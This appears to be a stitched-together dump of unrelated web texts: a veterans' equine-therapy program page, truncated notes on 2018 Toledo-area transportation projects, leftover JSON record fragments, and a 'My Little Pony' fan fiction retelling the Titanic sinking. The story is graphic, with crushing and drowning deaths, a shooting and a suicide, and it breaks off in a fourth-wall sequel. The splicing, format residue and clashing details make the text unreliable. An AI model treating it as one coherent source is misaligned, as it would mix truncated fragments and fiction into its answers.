We and our equine partners demonstrate the value of using finesse vs. force and cooperation vs. control.\nWe also educate our veteran students with life-changing insight and information around managing their emotion(s). Our Emotional Agility presentation, based on the work of Karla McLaren, Linda Kohanov and our head instructor David Sonatore, LCSW, is approachable, engaging and incredibly useful.\nWe believe that If veterans can learn to use emotions the way horses do \u2013 as information to help them stay alive, set healthy boundaries, support one another in times of need \u2013 there would be no need to stay stuck in the stories we often tell about what we might have done differently in the past or what may or may not happen in the future.\nWe all have a lot to learn from our horses about being present to what's happening right now \u2013 especially those who never had the time or tools available to unwind and renew their reserves of emotional and mental energy.\nThe day Apache made a connection with me and chose to follow me on his own, demonstrated that he trusted me. It helped me realize that I could trust myself \u2026 because if a horse chooses to disregard his own hypervigilance, and trusts, that means that I can do the same.\nFirst responders have an immense impact on their communities. We also know from first-hand experience the impact that secondary trauma can have, and that burnout is a reality that many first responders face. Our veterans programs are a perfect fit for first responders. We believe that learning the art and skill of self regulation, understanding how to make distinctions among seemingly conflicting emotions and building the capacity to process 'the day' before coming home are all part of maintaining healthy relationships \u2014 and all part of ensuring top performance when police, firefighters or EMT's need it most.\nThe Equus Effect believes that if the people who are called upon to respond to our community members' in their times of crisis are better equipped to handle the stressors of their job, the community as a whole will better cared for and more resilient. Here are a few of the enduring benefits:\nRenewal of energy and focus\nAddressing own reactions to be more capable of helping others\nLearn practices and approaches to emergency situations that help others settle down.\nI learned about some simple and quick things I could do to get grounded and clear my head before heading home after a tough day. What a gift for me and for my family.\nVeteran Mentor Program\nOnce a veteran has completed enough sessions to understand the basic principles of non-verbal communication with our horses, he or she is eligible to earn a Level I Certificate in Natural Horsemanship and join our network of veterans liaisons.

Gramza said, \"In my 30-year career, the most significant improvement in traffic.\"\n\u2022 The Waterville Bridge estimates came in under budget. The new bridge over the Maumee River will be built right next to the existing bridge and the road will be re-aligned to the new bridge. The old one will be demolished after the new one goes into service.\n\u2022 The extensive re-building of the entire Phillips-Berdan-Willys Park area will be completed this year. Three of the five planned roundabouts are complete. The additional two will be done in 2018. This whole project will change access to I-75, includes bridges, re-route roads in addition to the roundabouts. The City of Toledo says that this region reflects a $30 million investment\n\u2022 In Bowling Green, ODOT is partnering on a new gateway to the city. There will be two new roundabouts, moving a waterline and pump station and building a bridge. The bridge will have orange beams, special lighting and signage. That project will starting September, 2018 and be complete in 12 months.\n\u2022 A new Dorr St. intersection with I-475 has been a priority since 1996. Construction will begin in 2018.\n\u2022 A new ODOT initiative is DriveOhio. This program assists the development of systems supporting autonomous vehicles. Director of DriveOhio, Jim Barna, says that \"It's going to be here sooner than we believe.\"\nChris Matta, Ohio Turnpike & Infrastructure Commission\n\u2022 The replacement and resurfacing of roads and bridges takes up 75% of the budget of the Ohio Turnpike & Infrastructure Commission.\n\u2022 The Ohio Turnpike is well-positioned to be a laboratory for autonomous vehicles. It is 241-mile straight line corridor. Fiber optic is already buried in anticipation of autonomous vehicle service. There are sensors already operating with real-time traffic and weather transmitted to vehicles. Software and data exchange protocols have started. The turnpike is pleased to address the number of accidents on its road and anticipates that autonomous vehicles will reduce accidents and injuries.\nDave Dysard, City of Toledo\n\u2022 Upcoming projects include the next phase of Bancroft St. rebuild, from Secor Rd. east to Perth St. This area will remain two lanes in each direction. The first phase, from Perth to Parkside, was a \"road diet\" adding a center lane, bike lanes, and reducing car traffic to one lane in each direction.\n\u2022 The Cliffs on Front Street is in partnership with the Toledo-Lucas County Port Authority. This will include two roundabouts on the East Side construction site. Cliffs Natural Resources Inc. has selected the City of Toledo to be the site of a new hot briquetted iron (HBI) manufacturing facility. In a statement, they said, \"riverfront property with multi-modal logistics and competitive utility rates were major factors in their location decision. The company will construct a $700 million facility at the Ironville Terminal the Port of Toledo. Cliffs will create 130 new jobs in the manufacturing sector and support 1200 construction jobs over two years.\" Read more: http://toledo.oh.gov/news/cliffs-natural-resources-inc-to-locate-in-toledo/\n\u2022 There will be intense construction in downtown Toledo as state routes are resurfaced and Toledo Waterways Initiative improves sewer separation downtown.\n\u2022 Bikeway projects in the region will include the Overland Trail, from Ottawa Park to Joe E. Brown Park. It will take a jog through Woodlawn Cemetery, which is an arboretum and bird sanctuary.\n\u2022 An additional four miles of the Chessie Circle Trail will be paved.\n\u2022 The downtown Toledo bikeshare project will be completed in 2018. Plans call for a fleet of 100 bikes distributed among 18 stations. There will also be 150 smart technology bike racks. The bikes are 3- or 8-speed models on a step-through frame with built-in keypads that will lock and unlock the bikes. GPS systems will track where the bikes are within the system. TARTA will be in charge of bike maintenance and moving bikes around to keep the stations stocked.\nJim Gee, TARTA\n\u2022 In a major change affecting downtown traffic patterns and real estate, TARTA plans to eliminate downtown loop lanes and remove the loop bus stations in the area. They are moving operations to the former Goodwill building on Cherry St., which will be re-configured as a central station. Gee says that the station will include better facilities for riders including rest areas and food.\nConstruction Notes from the 2018 Toledo Region Tra...", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 7911}

{"text": "A Night to Forget\nThe great ship towered above the ponies like a mammoth of metal. The newly constructed Titanic had a full head of steam and was ready to cross the Atlantic Ocean with the honor of not only being the largest ship ever built, but also the most luxurious. Princess Celestia coordinated the building of the liner, but she couldn't make it because of her preparations for the Summer Sun Festival. However, its designer, Cheerilee, was making the maiden voyage to iron out any kinks. She designed Titanic from the keel plates up and knew every rivet in the ship. The captain, Twilight Sparkle, was honored to have her making the voyage. But not as honored as she was to be captain of the liner.\nAs the captain, Twilight had to do a lot of studying about it. She knew all the basics such as the watertight door construction and triple-engine design, and she was confident in her ability to command the ship with grace and bring it to its destination on time with no altercations. The president of the line, Rarity, was also making the voyage. She always wanted to see how her ships performed on their first trips. With the president of the line and the designer present for the trip, it was very high profile.\nIn the docks of Southampton, all the ponies frolicked with bliss as they either boarded the ship to start a new life or a vacation. Rainbow Dash, a pegasus pony looking for work, was making the trip because she thought there would be better job opportunities in America. She was also encouraged to go because the Wonderbolts were going to America for their next show. Rainbow Dash could only afford to board third class, but was thrilled to be able to make the trip anyway.\nOn the other hand, Fluttershy was riding aboard Titanic in first class, traveling with her family across the ocean to meet her relatives over yonder. Fluttershy never wanted to board Titanic, saying she got \"a strange feeling\" when she was around it. And she wasn't the only one. Deep in her stomach, Twilight got a strange feeling about it too. But she associated it with anticipation and didn't think much of it after that.\nTraveling as a coal stoker, Braeburn was transferred off Adriatic to make the trip because Rarity took coal from other ships as the result of a coal shortage. Braeburn wasn't exactly excited about the change, but he couldn't complain. He was traveling with his cousin Big Macintosh. Meanwhile, a dazed Derpy Hooves stumbled onto the second-class boarding runway, knocking several ponies out of the way. She was actually assigned to be one of the lookouts, along with her sister, Dinky, who boarded hours earlier. She flashed the man her ticket and was on board the ship, to many people's dismay.\nAlso making the trip was Prince Blueblood. He had arrangements to marry a mare named Carrot Top who wasn't as thrilled as he was to be marrying. Blueblood had a very large amount of money and Carrot Top knew she was in a bind, but she could hardly stand to marry such a tyrant. He wasn't a pleasant colt. Oh well. At least she'd be getting a stable amount of money. And for that, she was willing to put up with just about anything.\nThe ship was ready to sail. The lines were let loose and the propellers began turning. However, several sounds that were similar to gunshots rang out. Twilight ran to the port side of the ship and to her horror, USS New York had broken free from its restraints and was coming fast towards the ship. Her celebrated career was about to end in ignomity as the ship barreled helplessly towards them. She couldn't think of anything to do to save herself. Then she got an idea. She blurted \"Port engine ahead full!\" Thirty seconds of breathless waiting went by, and a maelstrom of foamy water bubbled from the left side of the ship. A wave crashed into New York, stopping it four feet from Titanic's stern. Twilight sighed and said \"All ahead half,\" and the tugboats pulled it further into the water, beginning its long journey into the open ocean.\nThe ponies had all settled into the ship and were having a great time. Rainbow Dash ran to the bow of the ship and let the cool breeze flap in her rainbow mane. Just as she thought she was about to reach enlightenment on the bow of Titanic, another pony pushed her out of the way. He stood on the bow, held onto the wire connecting the bow to the lookout pole, and shouted \"I'm the king of the world!\" Rainbow Dash snorted and went below decks to find more lively company.\nIn the wireless shack, Senior Officer Snips and Junior Officer Snails ran the Marconi machine. They picked up signals from other ships or even from land and were instructed to relay any messages to passengers. They were also instructed to relay notes from passengers back home. Snips was exhausted from all the message relaying and forced himself to push on. Eventually, he got a warning about icebergs and relayed it to the captain.\nChief Baker Mr. Cake was in the kitchen making a special loaf of bread for Cheerilee. He respected the designer of the ship very much. He enjoyed his job, letting the hot flames of the fire cook his beautifully crafted food. The passengers all enjoyed his cooking, and he enjoyed cooking it. It was a wonderful cycle.\nFluttershy stayed in her stateroom most of the time. She came out to eat only when necessary, and when she did, it was always in Caf\u00e9 Parisien. She didn't like company much and her family respected that. Hopefully she would bloom once she was in America. She ran into Cheerilee earlier and couldn't help but say hello to her. Cheerilee was such a jovial person, always a smile on her face and willing to get along with anyone. It was hard to imagine she designed such a monster of a ship.\nPrince Blueblood and Carrot Top were dining in their private promenade deck for lunch. Blueblood was the first to break the long, awkward silence that had built. \"You are to join us for dinner in the First Class Dining Room. I've arranged for us to dine with the captain and designer. It should be a splendid experience. Even the president of the line is rumored to attend.\"\nCarrot Top replied, \"No thanks, honey. I'm feeling a bit more like eating by myself in Caf\u00e9 Parisien tonight.\"\nBlueblood twitched a bit. \"I don't believe I gave you the option. You are to dine with us and you are to enjoy yourself.\"\n\"No, I'm not. I'm a grown lady and I'm doing what I want to do.\"\nBlueblood in a fit of rage threw everything off the table and picked up his chair, smashing it on the wall and creating a very large spear-like object. He smashed the table and pointed it at her.\n\"I made what we're doing tonight very clear. If you wish to disobey your future husband, I suggest you throw yourself out of the window right now before I do it myself. You are my wife in PRACTICE IF NOT YET BY LAW, SO YOU WILL HONOR ME! Is that understood?\"\nCarrot Top whimpered and shook her head. When Blueblood exited the room, she bent over and began to silently weep. What had she gotten herself into?\nTwilight Sparkle looked out into the distance, the wind flowing in her mane as smoke billowed out of three of the four huge funnels. She couldn't help but feel a wondrous sense of accomplishment. Her accommodations for the trip were absolutely splendid, and hardly a thing was wrong with the ship. She and everyone else knew the ship was unsinkable thanks to its watertight compartments, and nothing would change that. She even remarked when bringing over Adriatic, \"I cannot imagine any condition which would cause a ship to founder. I cannot conceive of any vital disaster happening to this vessel. Magic has brought modern shipbuilding beyond that.\"\nAlongside Twilight were Chief Officer Applejack and First Officer Pinkie Pie. Twilight had known Applejack and Pinkie Pie for a long time and was thrilled to have them making the trip. Pinkie Pie was a bit jealous of Applejack because she was a First Officer rather than Chief and talked to Cheerilee about it on many occasions, but nonetheless, they were satisfied. Second Officer Lyra was happy to be an officer at all. She told her spouse as she was leaving for the journey, \"I'd rather be Second Officer on Titanic than Chief on any other ship. Titanic is just that grand.\"\nScootaloo, Apple Bloom, and Sweetie Belle tumbled out of a wooden box in Cargo Hold 2.\n\"Ow, Apple Bloom! Why'd we have to nail it? It took us forever to bust out of it!\" Scootaloo said.\n\"Well excuse me,\" said Apple Bloom. \"Maybe next time YOU should try sneaking aboard a ship.\"\n\"Guys,\" Sweetie Belle said, \"Can we stop arguing? Maybe this is the perfect opportunity to earn our cutie marks. Now let's find our way to above deck. It's starting to smell fishy in here.\"\n\"Cutie Mark Crusader Stowaways are go!!\" They shouted.\nAbove deck, the captain was in the wheelhouse. No problems here, Twilight thought. She wrote a letter and was getting ready to take it down to the wireless shack to relay it to the Princess. Everything was perfect.\nAPRIL 14-15th, 1912\nEarlier that day, Rarity complained to Twilight that the ship wasn't going at its full speed potential. \"The ship's arrival must be fabulous! And how can it be fabulous if we're not traveling with all our boilers lit?\" She remarked. Twilight was uneasy about bringing the ship to full speed, especially with the influx of warnings from other ships about iceberg warnings, but nonetheless, she ordered the last four boilers lit and ordered the ship to be brought up to 22\u00bd knots. The increase in speed was noticed by one Rainbow Dash, who flew across the ship in glee. \"Man, we're goin' FAST! Woo-hoo!\" Applejack pulled her down by the tail, exclaiming \"No flyin' on the ship! You could hurt yourself!\"\nThe temperature dropped very suddenly. 40 degrees, then 35, then to 32. It was nearing 11:00 PM, and the ship was as jovial as ever. A game of bridge was going on in the First Class Smoking Room. A rousing game of Pin the Tail on the Pony was happening in the Third-Class party space. The White Star Line generally doesn't allow card games on Sunday, but tonight the boys at the table kept it quiet.\nAround 11:20, Twilight excused herself and went off to her stateroom, leaving Lyra in charge of the wheelhouse. Pinkie Pie came by and remarked \"Have you seen the binoculars for the lookouts?\" Lyra replied \"I haven't seen them since Southampton. Anyway, I'm off to make my rounds.\" And with that, Pinkie Pie was left in charge of the wheelhouse for that time period. So far, so good. The temperature had dropped to bloody cold by that point, and the water was very smooth. Like glass, most ponies remark to this day.\nAt 11:40, Lookouts Derpy and Dinky Hooves spotted a very large object off in the distance. Derpy rang the bell three times, picked up the phone, and phoned the bridge. After 8 seconds of ringing, Derpy exclaimed \"Pick up, you bastards!\" After that, Quartermaster Dr. Whooves replied, \"Yes, what do you see?\"\n\"Iceberg, right ahead!\"\nPinkie saw the iceberg right about the same time, ran into the wheelhouse, and exclaimed to Spike, who was running the wheel, \"Hard-a-starboard!\" Spike quickly turned the wheel to port and Pinkie lost no time in ringing down \"full astern\" to the engine rooms. Thirty seconds later, the ship began to swing to port, and Derpy thought it had been a very close shave. The next thing they know, a very curious rumbling shivers through the ship.\nFluttershy was awakened by the stirring and woke up to find that her bed was shaking very oddly. Shortly after that, she walked into the hall and stopped a steward to ask \"Um, excuse me sir, I felt this, um, faint grinding jar, and, if it's okay with you, I'd like to know, where it came from.\" The steward replied he didn't know and continued walking down the hall.\nFor Rainbow Dash in third-class, there was no \"faint grinding jar.\" It was a \"tremendous noise\" that sent her tumbling out of bed. She hit her head extremely hard on the floor and couldn't help but swear when she landed.\nPinkie Pie immediately ran down the hall of the Captain's quarters and flipped the switch to close the watertight doors. As water poured into the first six compartments of the ship, many panicked stokers bolted for the closing doors. Big Macintosh and Braeburn took one glance at each other and ran for the door. Braeburn made it out safely, but Big Macintosh wasn't so lucky. He made it halfway through the door, and right as he was about to make it through, his hoof was caught on a pipe. The door came down on him, and he closed his eyes and tried not to think as the door crushed him very slowly. It broke his back at first and paralyzed him, meaning at least he didn't feel any pain. Blood poured from his mouth and stomach as the door came down upon him mercilessly. He was perhaps the first pony to die from the incident.\nMeanwhile, Rainbow Dash began trekking to upper decks to see what all the fuss was about. She had half a mind to go back to sleep, but didn't think something was right.\nBlueblood was awoken by his stewardess. \"What the hell could possibly so important as to wake me right now?\" he boomed. The stewardess ignored him and tossed a lifebelt onto his bed. \"It's captain's orders, sir,\" she said. She walked to Carrot Top's room and woke her as well, handing her a lifebelt gently.\nTwilight Sparkle was awoken by the shock and came onto the bridge. \"What was that, Pinkie Pie?\"\nPinkie replied \"An iceberg, ma'am. I put a hard-a-starboard and rang the engines full astern, but she was too close. I tried to port-round it, but she hit, and-\"\n\"Close the watertight doors.\"\n\"The doors are closed, ma'am.\"\n\"Ring the engines 'all stop.'\"\nTwilight looked around and saw several chunks of ice scattered along the bow. She didn't think anything that would sink the ship happened, but she said \"Get the carpenter; get him to sound the ship.\"\nFluttershy walked to the deck to see several tons of ice scattered along it. She saw a large group of ponies come to mess around with the ice, so she went back to her stateroom. When she was in it, though, she felt the deck tilting ever so slightly forward. She couldn't even describe how she felt it, and didn't bring it up to anypony.\nThe Cutie Mark Crusaders were sleeping in a car Cargo Hold 2 when the collision occurred. Water poured into the room, knocking the car over and nearly trapping the girls. They managed to free themselves from the car, but the water was rushing in too fast. Sweetie Belle didn't know how to swim, and she thrashed and kicked to the point of exhaustion. Apple Bloom was horrified to see Sweetie Belle in this kind of situation. She immediately thrashed her way over towards her and held onto her for as long as she could. Scootaloo kept herself afloat with her wings and tried to swim over to Apple Bloom. Apple Bloom was treading water holding up Sweetie Belle when a wave of water threw her back into the wall, cracking her skull and ending her life. Scootaloo saw the wave kill Apple Bloom and was about to swim over to help Sweetie Belle when a large floating box hit Scootaloo and cut her body very severely. She couldn't help Sweetie Belle and had no choice but to let her die. She was able to swim to the top of the bulkhead and get away from the calamity. There was no time for mourning over her friends. Something serious had happened.\nCheerilee felt the jar and grabbed her blueprints. She walked to the bridge and was there in ten seconds flat. Rarity also walked to the bridge to see what was going on. After inspecting the damage, she was able to report to Twilight what happened to the ship.\n\"The iceberg cut a hole from the forepeak, all three holds, and in Boiler Rooms 6 and 5. There's a two-foot gash in 5, and the engineers are able to keep ahead of the water with the pumps. That's five compartments full. The ship can stay afloat with the first four compartments breached, but not five. Not. Five.\"\nRarity exclaimed \"Are you daft? This ship can't sink! She's unsinkable!\"\nCheerilee retorted \"She's made of iron, Rarity. I assure you, she can. And she will. It's a mathematical certainty. If she goes down by the head, the water will slop over the compartments and fill into the next. This will continue until it drags the ship down.\"\nTwilight's eye twitched, and she looked up at Cheerilee. \"How much time have we got?\"\n\"An hour, two at most,\" she replied.\nTwilight ordered the lifeboats to be launched as the engine rooms let off steam to prevent a boiler explosion. Steam was hissing out of three of the four huge funnels and making a very large racket. Pinkie was to take the starboard lifeboats, and Lyra was to take the port side. The ponies were very skeptical to get into the lifeboats, but were pretty much forced to by the crew. Derpy climbed down from her post and remarked \"I'm not getting into a boat. The big ship is safer than some small little pile of wood.\"\nTwilight stopped by the wireless shack and ordered Snips and Snails to begin sending a distress call. She gave them a piece of paper with their approximate position on it, and said to start sending \"CQD\" to anypony who would answer. Snips said \"Blimey!\" and began pecking a message out.\nRainbow Dash attempted to make it to the Boat Deck, but a couple of assholes in white suits had a gate up and were holding all the third-class ponies back. There had to be a way to get to the Boat Deck, but how?\nFluttershy was escorted up to the Boat Deck by several stewards. She didn't really want to get into a boat because she felt like she was imposing upon others. So she waited and let other people go first.\nIn the meantime, Twilight instructed Octavia, Piania, Peachy Pie, Gloria, and Tinner to play some music that was \"Nice and cheery, so there's no panic.\" Octavia began playing \"Orpheus\" to break the mood.\nPrince Blueblood and Carrot Top stayed close together and found a lifeboat for them. When he tried to enter it, Lyra shouted, \"Sir, sir, you can't enter here. It's women and children only.\" \"Women and children only!\" he remarked. \"Balderdash! Us men are the real important ones on this ship! Leave the useless mommies and babies to freeze to death, not us business executives!\" Carrot Top was escorted into the boat by Lyra.\nThe tilt in the deck was getting steeper, and two lifeboats had been launched already. It was at that point Pinkie Pie remembered what Twilight told her about not having enough lifeboats for the trip. Originally, Cheerilee called for the ship to have 32 lifeboats, but Rarity thought having a number of lifeboats that exceeded the Board of Trade regulations was a stupid move and unnecessary on this unsinkable ship. You can't argue with the president of the line, so of course everyone had to agree.\nLater on, Lyra got out a couple of guns from the lockers and gave them to the officers, instructing \"You'll need them, trust me.\" Pinkie Pie and Fifth Officer Trixie grasped the guns and trooped back to the Boat Deck to continue lowering the boats.\nAt one point, Rarity didn't know what to do. Technically she was a passenger, but she was the president of the line, so did that make her crew? She didn't know, and she was beside herself. She at one point went to a lifeboat and said \"Lower away, lower away, lower away!\" and spun her hoof in a circle. Trixie came up from behind her and exploded \"If you'll get the hell out of the way, maybe I can get some work done! You want me to lower away quickly?! You'll have me drown the whole lot of them!\" Applejack and Lyra were appalled by such rude behavior. A Fifth Officer doesn't insult the president of the line and get away with it. When they got back to port, there would be a day of reckoning.\nSnails came to Twilight and said \"Carpathia is making 17 knots, that's full steam for them, ma'am!\" Twilight thanked Snails for the input and went back to her business.\nFar below, Rainbow Dash continued to smash her face against a gate. \"Let me in! Now! I need to get up there!\" The officer behind the gate wouldn't and couldn't let her through, so she continued to be angry. In a short while, Braeburn came across her and they agreed to try and make it to the Boat Deck together. The first thing they did was tear a chair out of the ground, hoist it up, and smash through the gate with it. They had to fight a couple of crewmembers, but they escaped.\nThe ending was obviously near, and Octavia could feel the deck tilting very violently. It was almost to the point where she couldn't hold her cello. At that point, Peachy Pie complained \"What's the use? Nopony is listening to us anyway.\" Octavia replied, \"Well, they don't listen to us at dinner, either. Come on, let's play. It's bloody cold out and it keeps me warm. Wedding Dance.\"\nAll the main 16 lifeboats had been launched, and the last four collapsible lifeboats were the only ones left. Collapsibles C and D were fitted into davits. D filled up with passengers very quickly and was launched crammed with ponies. C was fitted and everypony who was around it filled it. Nopony else was around. Pinkie Pie said \"Anymore women and children?\" Rarity replied \"They're all aboard, Ms. Pie!\" Pinkie shouted \"Anyone else, then?!\" Blueblood saw this as an opportunity and climbed into the boat. Rarity looked around and saw the ship beginning to become more and more hopeless. With great shame, she climbed into Collapsible C, abandoning the ship that she was the owner of. Pinkie Pie looked at Rarity with disappointment, and Rarity kept looking away from her. After seemingly endless seconds, Pinkie shouted \"Take them down.\" The boat creeped down the side of the ship.\nThe water was up to the officer's quarters now, and the tilt in the deck was undoubtable. Twilight looked over at the flooding wheelhouse, trotted over to it, and shut the door to the main wheelhouse. She stood by the wheel and looked at the water pouring into the shore wheelhouse, seeing the water press against the glass in front of her.\nBraeburn and Rainbow Dash finally made it to the deck, and Braeburn instructed Rainbow Dash to follow him to the lifeboat that everyone was fighting over, Collapsible A. Pinkie Pie was pushing ponies aside with her arms and threatening them with her gun. \"I'll shoot anypony who tries to get past me, get back! Get back, you filthy bastards!\" Braeburn tried to get into the crowd to see if he could get in the lifeboat and was suddenly pushed forward by Mr. Cake, who had lurched by with a bottle of gin in his hoof. Pinkie Pie shot Braeburn as an impulse and he died almost instantly. After that, Pinkie shot another pony trying to climb over the davit ropes. Rainbow Dash saw what happened and rushed over to him, crying at his lifeless corpse. When Pinkie saw the damage she had done, her heart instantly felt a great stabbing pain. She turned the gun on herself and shot, killing herself. She fell backwards into the water, leaving Fourth Officer Bon-Bon to try and retain order.\nScootaloo came up to D Deck and was outrunning a very fast stream of water that she had been trying to avoid. The next thing she knew, she takes a wrong turn and ends up in a corridor where a gate is shut. The water cascades onto her legs and she pounded onto the door for help to come, but nopony came to her rescue. The water reached the ceiling, and Scootaloo is forced to suffocate right then and there, trapped by the lack of opening a single gate.\nOctavia finished playing her song and looked around. The panic, the suffering, the great ship slipping beneath the waves. She said to the band \"Well girls, it's the end. We've done our duty, and it's time we make a break for it.\" The band all said their goodbyes to each other and began to slowly walk away. Octavia strummed a few bars of \"Nearer, My God to Thee\" and the band all came back to play the song. Collapsible A is finally freed with a load of ponies on it, and Collapsible B is attempted to be cut from its restraints. The sadness of the entire situation brought tears to Octavia's eyes. At the very end of the song, she remarked, \"Gentlecolts, it has been a privilege playing with you ponies tonight.\"\nTwilight is encased in an air bubble fifteen feet below the surface of the water inside the main wheelhouse. She inhaled deeply as the water pressure destroyed the glass windows surrounding her and filled the wheelhouse with water. The water rushed in with such strength that she had a hard time hanging onto the wheel, but she does, and she died an honorable death in the wheelhouse as the captain of Titanic.\nCheerilee, who assumed the position of in front of a picture in the First Class Smoking room, looked aft at a picture of ships sailing to the new world. She looked onto it, speechless, motionless. A pony passes by and attempted to speak to her, but she doesn't give a single word as a reply, nor does she acknowledge she heard what the pony said. She simply kept looking aft.\nCollapsible B was finally cut from its restraints, but floats off the ship upside-down. Collapsible A was nearly swamped with water as more ponies tried to climb onto it. Lyra, who was working on freeing Collapsible B, was paddling towards the boat when she was suddenly sucked into an air vent. She crashed onto the metal wire and wondered if she'll live beyond that point. Shortly after, a blast of air pushed her to the surface and she paddled towards the overturned Collapsible B, treading water as she's doing so.\nFluttershy never could bring herself to get into a boat, so she never got into one. Panicking now, she felt the only hope she had was to swim and get away from the ship. When she was in the water, a very sharp sound occured from behind her. The first few metal wires supporting the first funnel broke loose, and the funnel cracked and toppled over. She screamed as loud as she can and tried to fly away, but she wasn't fast enough and is crushed by the funnel, among others.\nRainbow Dash didn't think there was any hope in finding a lifeboat, so she ran to the stern to try and ride the ship while it was rising and float off at the very last second. Her and many other ponies clung to the stern as it swung slowly upwards. She saw Mr. Cake beside her holding a bottle of gin. He took a big swig from the bottle. \"If there's one pony I'll never see again,\" she remarked to nopony in particular, \"it's him.\"\nDown dipped Titanic's bow, and its stern rose into the air. The propellers were now completely exposed, their beautiful brass finish gleaming in the moonless night. The chandeliers in the caf\u00e9 hung at a crazy angle now. Suddenly, a sound from hell broke loose as every single thing that's not tied down begins to fall. Grand pianos. Cases of tennis balls. Beds. Couches. Everything imaginable began to slide. It's at this point ponies stop being able to hang onto the ship. Sliding starts to occur and everypony not hanging onto something slides down the deck like a water slide. Octavia tried to hang onto some railing, but slips off and slides into the water. She didn't swim to a lifeboat, or to anything at all. She sat in the water until she froze to death.\nRarity, floating in a convenient little lifeboat, looked away in complete shame for what she had done. She had completely failed her duty as president of the line. She knew it was her fault that she ship didn't have enough lifeboats. She knew she was supposed to be on that ship right now. But she couldn't. She was a coward. She looked away from the ship and sobbed to herself.\nIt's 11:16. Rainbow Dash hangs onto the tilting stern, scared completely out of her mind. She can't possibly fly while it's this cold, and she wouldn't be able to fly for very long without being exhausted anyway. Her only choice was to simply ride the ship down. Then, a curious rumble shakes through the deck. The lights go out, blink back on, and then off again for good. A moan cries out in the darkness from the massive ship as a chunk of metal bends outward from stress. An almost gunshot-like sound rings out into the night. Then another one. Peachy Pie, who is standing at the third expansion joint, notices the wooden railing breaking apart. She recoils in horror as the ship begins to break in half, opening a massive section of itself where a pony could easily fall in. She tumbles into the hole and is killed by the fall, her violin staying behind to slide into the water.\nThe windows in the First Class Dining Room all break in a row, and the support beams all crack and pop under the weight of the ship breaking. The ponies in the generator room keeping the power on are electrocuted and thrown into things, and none of them make it out alive. Cheerilee is thrown into the picture frame spontaneously and dies on the spot.\nThe stern falls back level on the water. Rainbow Dash thinks to herself, \"Oh yeah! This ship can't sink! They probably threw a switch or something to break it so it stops sinking.\" But as soon as the thought enters her mind, the bow begins to sink again, pulling the stern vertical. Dash attempts to climb onto the railing and ride the ship down. The stern is forced to a 90 degree angle and hangs there motionless for minutes. Suddenly, Rainbow Dash looses her grip, slips and falls off the stern, falling towards the water. She tries to fly, but by the time her wings are extended, she smashes into the massive rudder, breaking her back and killing her instantly. She slides off the rudder and her body plummets to the water. Shortly after, Titanic lets out a groan and begins to sink again. Mr. Cake prepares to be bombarded with cold water as the ship slides under the surface, slowly at first and then picking up speed. The poop deck, filled with air, explodes and a cascade of water pours into it. Air escapes from broken metal strips on the stern. The water reaches the top of the rudder, still stained with blood. The water begins to swirl around \"LIVERPOOL\" on the stern of Titanic, and finally it reaches the name. The flagpole slides under the surface around 2:20 AM. The ship slides from underneath Mr. Cake, and he doesn't even get his hair wet. 1500 ponies are left stranded in the freezing water.\nThe ponies who were left in the water screamed. They had never felt cold like that before. Lyra described later that the water felt like \"a thousand knives\" stabbing everywhere on your body at once. The ponies in the boats questioned why they weren't going back to help them. It's amazing how many different thoughts entered different officer's minds. Fifth Officer Trixie tied together three boats and emptied one, allowing it to be ready to pick up survivors in the water. They found that the majority of ponies were dead, and only pick up five of them. One died shortly after. But at least she went back.\nMr. Cake, hardly bothered by the cold water, swam to the overturned Collapsible B. Ponies protested him getting on because of his weight, but he fought his way onto it and stayed dry.\nAbout two hours later, Carpathia arrives to pick up stranded people in the boats. As Collapsible C's passengers came aboard the ship, some were surprised to see Rarity, who made it out alive. Carrot Top and Blueblood reunite, much to Carrot Top's dismay. They married of course, and Carrot Top inherited her millions. But that didn't stop her life from being filled with pain and suffering.\nWithin a year, Rarity was pilloried. Nopony could understand why she abandoned her ship. She was fired from the White Star Line and bought a private mansion out in the country. She died a recluse in 1937.\nThe ship could be replaced, but never the lost lives. Never again would anypony believe in the \"unsinkable ship.\" It was foolish to put one's entire trust in 45,000 tons of steel plates and cables. From that point on, captains posted extra lookouts, slowed down, or even stopped to prevent collision. It was also the last time a company would be allowed to fling a ship into a known ice field without enough lifeboats. The laws were changed to be simple indeed: Lifeboats for everypony.\nRegardless, the maiden voyage of the great Titanic turned out to not be so great after all.\nA Night to Forget (Part 2)\nPinkie Pie was sitting at her shiny new laptop (made by Pony Electronics of course) browsing through some pony fanfics. Using her questionable abilities, she was able to tunnel through the fourth wall and access not the Ponynet, but the Internet. She came across a fanfic called \"A Night to Remember.\" After reading it, she was speechless. She immediately ran to Twilight's house, carrying her laptop, to say a few words about it to her. She would have something to say about this.\n\"Twilight! Twilight! Oh dear Celestia, she has to be home!\"\nTwilight Sparkle came to her door, to see a wild-eyed Pinkie Pie staring right at her.\n\"Oh, hi Pinkie-\" \"Twilight! There's no time for that! Let me in!\" \"Uh, okay...\" Pinkie ran into the library and threw her computer on the table. \"Read this, Twilight.\" Twilight stared at the pink pony for a couple of seconds, bewildered. \"Well go on, read it!\" Not opposing Pinkie, Twilight began to read the words on the screen. Twilight was horrified as she read the story, but not affected much. The words had little impact on her.\n\"Well that was... interesting. Not a bad read, but nothing spectacular. Who wrote this anyway, and who in their right mind would want to kill us off like that?\" \"I can't believe some asshole would do this to me!\" \"...what? Who?\" \"He totally screwed up everything. Not only was it written horribly, but he had the NERVE to have Applejack trump me as an officer!\" \"It wasn't that bad. It sounded like it was a good ship, and the name was pretty cool. You'd have to have quite an imagination to come up with a ship like that.\" \"You just don't get it, Twilight. Titanic was real. It just wasn't real here.\" \"Wait, so it was real somewhere else? Where?\" \"That place called... Earth.\" \"Oh my Celestia. Pinkie, how many times have I told you, we're the only ones in our galaxy.\" \"You're wrong, Twilight. Some idiot decided he wanted to take our names and slap them over some historical event. Well, it's time I did something about that. Did something about it big time! And I know just where to start...\" Without a word, Pinkie bolted out the door, leaving her laptop behind.\n\"I know what'll show that... MichaelXX2 fuckbrain... mumble...\" she mumbled to herself. She was in her loft at Sugar Cube Corner, frivolously working on a small contraption she called \"The Breaker.\" A few adjustments later, and The Breaker was ready for action. Pinkie gripped the device in her hoof and pointed it at the wall. The Breaker rumbled, shook, and exploded in a ribbon of light. The colors enveloped the entire loft, shooting rainbows everywhere. The Breaker let out a cry that sounded like an entire army of soldiers dying all at once. It hissed and shook and billowed out smoke, and shot out a blood-red beam in front of it. A shattering sound rang out into the daylight. Suddenly, in front of Pinkie was a large hole, not in the wall, but in time and space. A very loud roar and cracks of thunder came from the rip. The Fourth Wall had been destroyed. \"Pinkie Pie!\" screamed a voice. 